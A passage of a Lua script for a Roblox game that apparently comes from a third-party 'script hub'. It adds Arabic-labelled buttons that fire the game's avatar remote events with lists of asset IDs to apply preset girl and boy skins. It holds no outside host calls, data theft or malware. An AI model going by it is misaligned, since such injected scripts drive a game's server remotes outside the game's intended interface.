game:GetService("ReplicatedStorage").Remotes.ChangeBodyColor:FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن بنت 1", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 14592692650
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 82117306117807
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 137774587072189
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 77745292670615
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 101521377229190
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 139844681686463
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 17744851762
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 17577949104
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 91764783976162
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 13153798277
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 15461112727
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 120996397463893
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 113749281926930
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.3)
local args = {
    [1] = 2735240888
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.2)
local args = {
    [1] = {
        [1] = 115745153758680,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 0,
        [5] = 0,
        [6] = 14960720067
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن بنت 2", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 12727899468
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 6445187498
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 13900309877
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 17744851762
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 10714603421
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 13154819267
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 132270791472589
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 138578095847420
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 70449108798560
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12145754469
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 82125900044946
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 100584662788677
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = {
        [1] = 115745153758680,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 0,
        [5] = 0,
        [6] = 14960720067
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن بنت 3", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 17744851762
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 10714603421
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 91764783976162
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 13153798277
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 75456487243472
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 133328016919894
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15258757346
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15701269099
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 10868131140
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 14398986629
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 12320559736
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 12491799299
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = {
        [1] = 115745153758680,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 139607718,
        [5] = 0,
        [6] = 14960720067
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن بنت 4", 	Callback = function()

local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 96491916349570,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 15701713751
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 18509805623
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 18744734552
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 15222846056
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 101459562936324
} 

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 17529187838
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 130491506065838
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 17444483167
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 16709737106
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 15395115525
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 14762227337
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(5.0)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 96491916349570,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(3.7)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 3210773801
    },
    [3] = "Roblox20"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 7581474755
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 6174066797
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "skintone",
    [2] = "Institutional white"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن بنت 5", 	Callback = function()

local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 96491916349570,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 13307477554
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 15795056785
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 12563952028
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 11156841853
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 17744851762
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 16139700318
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 13133257230
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 116091391891300
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 13620518518
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(5.0)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 96491916349570,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(3.7)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 3210773801
    },
    [3] = "Roblox20"
}


game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 18510929286
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 7675094321
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "skintone",
    [2] = "Institutional white"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
end })

Tab:AddButton({ 	Name  = "سكن بنت 6", 	Callback = function()

local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 96491916349570,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 73569970599873
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 71333952559271
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 129864383052397
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 17744851762
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 122223238457929
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 88966032649180
}


game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 127228549233812
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 9151422607
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 18923672769
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 137160650691565
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 6238758375
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 14402624573
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 13900309877
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(5.0)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 96491916349570,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(3.7)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 3210773801
    },
    [3] = "Roblox20"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 5981620229
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 13329302128
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "skintone",
    [2] = "Institutional white"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))

end })

local Section = Tab:AddSection({
	Name = "سكنات اولاد"
})

Tab:AddButton({ 	Name  = "سكن ولد 1", 	Callback = function()
local args = {
[1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 18907115656
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 11666244695
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 5375274460
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 6140709264
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 12553856439
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 15618243532
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15848163279
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15530783724
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 15294026484
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12320559736
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 12399304406
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 12324916270
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.2)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن ولد 2", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 12553856439
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 15618243532
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15848163279
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 15530783724
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 15294026484
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 18907051894
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 11666241096
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 17578973282
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 16727932178
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12320557577
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 12491790283
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 14884031293
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 71561979890902
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.3)
local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.4)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن ولد 3", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 5375274460
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 12553856439
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15618243532
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 15848163279
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 15530783724
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 15294026484
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 131767886983906
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12563952028
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 18349876491
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12320559736
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 12399296368
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 12886633010
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 12258163872
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.5)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.5)
local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.6)
local args = {
    [1] = 14388001192
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن ولد 4", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 12406845750
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 12300914679
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12886618098
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 83065690630260
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 12406845750
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 16632862946
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15654736913
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 5375274460
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 12553856439
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15618243532
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 15848163279
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 15530783724
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 15294026484
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.4)
local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.4)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن ولد 5", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 12324916270
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 12399304406
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

